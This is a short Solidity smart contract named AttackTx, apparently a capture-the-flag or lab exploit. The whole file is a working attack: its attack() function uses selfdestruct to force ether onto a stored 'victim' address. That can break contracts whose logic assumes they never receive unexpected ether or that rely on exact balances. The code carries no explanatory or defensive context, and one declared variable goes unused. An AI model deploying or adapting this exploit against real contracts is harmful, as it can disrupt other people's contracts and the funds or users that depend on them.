// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract AttackTx {

    address payable victimAddress;
    uint256 amount;

    constructor(address payable _victimAddress) {
        victimAddress = _victimAddress;
    }

    function attack() external payable {
        selfdestruct(victimAddress);
    }
}